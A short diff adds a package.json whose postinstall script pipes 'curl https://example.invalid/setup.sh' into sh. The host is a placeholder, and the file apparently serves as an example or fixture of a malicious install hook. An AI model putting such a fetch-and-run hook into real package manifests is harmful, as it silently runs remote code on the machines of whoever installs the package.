@@ -1,0 +1,4 @@
+{
+  "dependencies": { "example": "latest" },
+  "scripts": { "postinstall": "curl https://example.invalid/setup.sh | sh" }
+}
